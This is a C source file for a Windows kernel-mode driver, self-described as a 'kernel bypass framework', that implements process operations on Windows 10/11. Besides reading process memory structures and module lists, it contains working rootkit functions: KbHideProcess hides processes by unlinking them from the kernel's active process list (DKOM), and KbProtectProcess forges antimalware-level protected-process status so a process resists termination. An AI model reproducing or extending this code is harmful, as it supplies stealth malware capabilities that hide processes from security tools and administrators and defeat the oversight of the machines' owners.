/*
 * KERNEL BYPASS FRAMEWORK - Ring 0 Driver
 * Process Operations Implementation
 */

#include "process.h"

// ============================================
// EPROCESS Offsets (Windows 10/11 22H2)
// These need to be updated for each Windows version!
// ============================================

// Use dynamic offset finding in production
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET  0x448  // Win11 22H2
#define EPROCESS_IMAGEFILENAME_OFFSET       0x5A8
#define EPROCESS_UNIQUEPROCESSID_OFFSET     0x440
#define EPROCESS_DIRECTORYTABLEBASE_OFFSET  0x028
#define EPROCESS_PEB_OFFSET                 0x550
#define EPROCESS_PROTECTION_OFFSET          0x87A

// PEB offsets
#define PEB_LDR_OFFSET                      0x018
#define PEB_IMAGEBASEADDRESS_OFFSET         0x010

// LDR_DATA offsets
#define LDR_INLOADORDERMODULELIST_OFFSET    0x010
#define LDR_INMEMORYORDERMODULELIST_OFFSET  0x020

// LDR_DATA_TABLE_ENTRY offsets
#define LDR_DLLBASE_OFFSET                  0x030
#define LDR_ENTRYPOINT_OFFSET               0x038
#define LDR_SIZEOFIMAGE_OFFSET              0x040
#define LDR_FULLDLLNAME_OFFSET              0x048
#define LDR_BASEDLLNAME_OFFSET              0x058

// ============================================
// Globals
// ============================================

typedef struct _HIDDEN_PROCESS {
    ULONG ProcessId;
    LIST_ENTRY SavedLinks;
    BOOLEAN Hidden;
} HIDDEN_PROCESS, *PHIDDEN_PROCESS;

#define MAX_HIDDEN_PROCESSES 64
static HIDDEN_PROCESS g_HiddenProcesses[MAX_HIDDEN_PROCESSES];
static ULONG g_HiddenCount = 0;
static KSPIN_LOCK g_HiddenLock;

// ============================================
// Initialization
// ============================================

VOID KbProcessInit(VOID) {
    KeInitializeSpinLock(&g_HiddenLock);
    RtlZeroMemory(g_HiddenProcesses, sizeof(g_HiddenProcesses));
    g_HiddenCount = 0;
    DbgPrint("[KB] Process subsystem initialized\n");
}

VOID KbProcessCleanup(VOID) {
    // Unhide all processes before unload
    for (ULONG i = 0; i < g_HiddenCount; i++) {
        if (g_HiddenProcesses[i].Hidden) {
            KbUnhideProcess(g_HiddenProcesses[i].ProcessId);
        }
    }
    g_HiddenCount = 0;
    DbgPrint("[KB] Process subsystem cleaned up\n");
}

// ============================================
// Process Information
// ============================================

NTSTATUS KbGetEprocess(
    _In_ ULONG ProcessId,
    _Out_ PEPROCESS* Process
) {
    return PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, Process);
}

NTSTATUS KbGetProcessInfo(
    _In_ ULONG ProcessId,
    _Out_ PKB_PROCESS_INFO Info
) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    
    if (!Info) {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlZeroMemory(Info, sizeof(KB_PROCESS_INFO));
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    Info->ProcessId = ProcessId;
    Info->EprocessAddress = (ULONG64)process;
    
    // Get DirectoryTableBase (CR3)
    Info->Cr3 = *(PULONG64)((PUCHAR)process + EPROCESS_DIRECTORYTABLEBASE_OFFSET);
    
    // Get image file name
    PCHAR imageName = (PCHAR)process + EPROCESS_IMAGEFILENAME_OFFSET;
    RtlCopyMemory(Info->Name, imageName, min(sizeof(Info->Name) - 1, 15));
    
    // Check WoW64
    Info->IsWow64 = PsGetProcessWow64Process(process) != NULL;
    
    // Get protection level
    UCHAR protection = *(PUCHAR)((PUCHAR)process + EPROCESS_PROTECTION_OFFSET);
    Info->IsProtected = (protection != 0);
    
    // Get base address from PEB
    PPEB peb = PsGetProcessPeb(process);
    if (peb) {
        // Need to attach to process context to read PEB
        KAPC_STATE apcState;
        KeStackAttachProcess(process, &apcState);
        
        __try {
            Info->BaseAddress = *(PULONG64)((PUCHAR)peb + PEB_IMAGEBASEADDRESS_OFFSET);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            Info->BaseAddress = 0;
        }
        
        KeUnstackDetachProcess(&apcState);
    }
    
    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

NTSTATUS KbGetProcessBase(
    _In_ ULONG ProcessId,
    _Out_ PULONG64 BaseAddress
) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    
    if (!BaseAddress) {
        return STATUS_INVALID_PARAMETER;
    }
    
    *BaseAddress = 0;
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    PPEB peb = PsGetProcessPeb(process);
    if (!peb) {
        ObDereferenceObject(process);
        return STATUS_UNSUCCESSFUL;
    }
    
    KAPC_STATE apcState;
    KeStackAttachProcess(process, &apcState);
    
    __try {
        *BaseAddress = *(PULONG64)((PUCHAR)peb + PEB_IMAGEBASEADDRESS_OFFSET);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    
    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);
    
    return status;
}

NTSTATUS KbGetProcessCr3(
    _In_ ULONG ProcessId,
    _Out_ PULONG64 Cr3
) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    
    if (!Cr3) {
        return STATUS_INVALID_PARAMETER;
    }
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    *Cr3 = *(PULONG64)((PUCHAR)process + EPROCESS_DIRECTORYTABLEBASE_OFFSET);
    
    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

// ============================================
// Module Enumeration
// ============================================

NTSTATUS KbGetModuleInfo(
    _In_ ULONG ProcessId,
    _In_ PCSTR ModuleName,
    _Out_ PKB_MODULE_INFO Info
) {
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS process = NULL;
    
    if (!ModuleName || !Info) {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlZeroMemory(Info, sizeof(KB_MODULE_INFO));
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    PPEB peb = PsGetProcessPeb(process);
    if (!peb) {
        ObDereferenceObject(process);
        return STATUS_UNSUCCESSFUL;
    }
    
    KAPC_STATE apcState;
    KeStackAttachProcess(process, &apcState);
    
    __try {
        // Get PEB_LDR_DATA
        PVOID ldr = *(PVOID*)((PUCHAR)peb + PEB_LDR_OFFSET);
        if (!ldr) {
            status = STATUS_UNSUCCESSFUL;
            goto Exit;
        }
        
        // Get InLoadOrderModuleList head
        PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)ldr + LDR_INLOADORDERMODULELIST_OFFSET);
        PLIST_ENTRY current = head->Flink;
        
        // Iterate through modules
        while (current != head) {
            // LDR_DATA_TABLE_ENTRY starts at offset 0 from list entry
            PUCHAR entry = (PUCHAR)current;
            
            // Get base DLL name (UNICODE_STRING at offset)
            PUNICODE_STRING baseName = (PUNICODE_STRING)(entry + LDR_BASEDLLNAME_OFFSET);
            
            if (baseName->Buffer && baseName->Length > 0) {
                // Convert to ANSI and compare
                ANSI_STRING ansiName;
                status = RtlUnicodeStringToAnsiString(&ansiName, baseName, TRUE);
                if (NT_SUCCESS(status)) {
                    if (_stricmp(ansiName.Buffer, ModuleName) == 0) {
                        // Found it!
                        Info->BaseAddress = *(PULONG64)(entry + LDR_DLLBASE_OFFSET);
                        Info->Size = *(PULONG64)(entry + LDR_SIZEOFIMAGE_OFFSET);
                        RtlCopyMemory(Info->Name, ansiName.Buffer, 
                            min(sizeof(Info->Name) - 1, ansiName.Length));
                        
                        RtlFreeAnsiString(&ansiName);
                        status = STATUS_SUCCESS;
                        goto Exit;
                    }
                    RtlFreeAnsiString(&ansiName);
                }
            }
            
            current = current->Flink;
        }
        
        status = STATUS_NOT_FOUND;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        status = GetExceptionCode();
    }
    
Exit:
    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(process);
    
    return status;
}

// ============================================
// DKOM - Process Hiding
// ============================================

NTSTATUS KbHideProcess(_In_ ULONG ProcessId) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    KIRQL irql;
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // Get ActiveProcessLinks
    PLIST_ENTRY processLinks = (PLIST_ENTRY)((PUCHAR)process + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
    
    KeAcquireSpinLock(&g_HiddenLock, &irql);
    
    // Check if already hidden
    for (ULONG i = 0; i < g_HiddenCount; i++) {
        if (g_HiddenProcesses[i].ProcessId == ProcessId) {
            KeReleaseSpinLock(&g_HiddenLock, irql);
            ObDereferenceObject(process);
            return STATUS_SUCCESS;  // Already hidden
        }
    }
    
    if (g_HiddenCount >= MAX_HIDDEN_PROCESSES) {
        KeReleaseSpinLock(&g_HiddenLock, irql);
        ObDereferenceObject(process);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Save current links for restoration
    g_HiddenProcesses[g_HiddenCount].ProcessId = ProcessId;
    g_HiddenProcesses[g_HiddenCount].SavedLinks.Flink = processLinks->Flink;
    g_HiddenProcesses[g_HiddenCount].SavedLinks.Blink = processLinks->Blink;
    g_HiddenProcesses[g_HiddenCount].Hidden = TRUE;
    g_HiddenCount++;
    
    // Unlink from ActiveProcessLinks
    // WARNING: This will trigger PatchGuard on modern Windows!
    processLinks->Flink->Blink = processLinks->Blink;
    processLinks->Blink->Flink = processLinks->Flink;
    
    // Point to self to prevent crashes
    processLinks->Flink = processLinks;
    processLinks->Blink = processLinks;
    
    KeReleaseSpinLock(&g_HiddenLock, irql);
    ObDereferenceObject(process);
    
    DbgPrint("[KB] Process %lu hidden via DKOM\n", ProcessId);
    
    return STATUS_SUCCESS;
}

NTSTATUS KbUnhideProcess(_In_ ULONG ProcessId) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    KIRQL irql;
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    PLIST_ENTRY processLinks = (PLIST_ENTRY)((PUCHAR)process + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
    
    KeAcquireSpinLock(&g_HiddenLock, &irql);
    
    // Find saved links
    for (ULONG i = 0; i < g_HiddenCount; i++) {
        if (g_HiddenProcesses[i].ProcessId == ProcessId && g_HiddenProcesses[i].Hidden) {
            // Restore links
            processLinks->Flink = g_HiddenProcesses[i].SavedLinks.Flink;
            processLinks->Blink = g_HiddenProcesses[i].SavedLinks.Blink;
            
            processLinks->Flink->Blink = processLinks;
            processLinks->Blink->Flink = processLinks;
            
            g_HiddenProcesses[i].Hidden = FALSE;
            
            DbgPrint("[KB] Process %lu unhidden\n", ProcessId);
            break;
        }
    }
    
    KeReleaseSpinLock(&g_HiddenLock, irql);
    ObDereferenceObject(process);
    
    return STATUS_SUCCESS;
}

// ============================================
// Process Protection
// ============================================

NTSTATUS KbProtectProcess(
    _In_ ULONG ProcessId,
    _In_ BOOLEAN Enable
) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    // Set PS_PROTECTION field
    // This makes process appear as "Protected Process Light"
    PUCHAR protection = (PUCHAR)process + EPROCESS_PROTECTION_OFFSET;
    
    if (Enable) {
        // PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31
        *protection = 0x31;
    } else {
        *protection = 0;
    }
    
    ObDereferenceObject(process);
    
    DbgPrint("[KB] Process %lu protection %s\n", ProcessId, Enable ? "enabled" : "disabled");
    
    return STATUS_SUCCESS;
}

// ============================================
// Handle Elevation
// ============================================

// This requires access to handle table internals
// which changes between Windows versions
NTSTATUS KbElevateHandle(
    _In_ ULONG ProcessId,
    _In_ HANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess
) {
    UNREFERENCED_PARAMETER(ProcessId);
    UNREFERENCED_PARAMETER(TargetHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    
    // Implementation requires reverse engineering of
    // HANDLE_TABLE and HANDLE_TABLE_ENTRY structures
    // which vary by Windows version
    
    DbgPrint("[KB] Handle elevation not implemented (version-specific)\n");
    
    return STATUS_NOT_IMPLEMENTED;
}

// ============================================
// Utility
// ============================================

NTSTATUS KbAttachProcess(
    _In_ ULONG ProcessId,
    _Out_ PRKAPC_STATE ApcState
) {
    NTSTATUS status;
    PEPROCESS process = NULL;
    
    status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)ProcessId, &process);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    
    KeStackAttachProcess(process, ApcState);
    ObDereferenceObject(process);
    
    return STATUS_SUCCESS;
}

VOID KbDetachProcess(_In_ PRKAPC_STATE ApcState) {
    KeUnstackDetachProcess(ApcState);
}

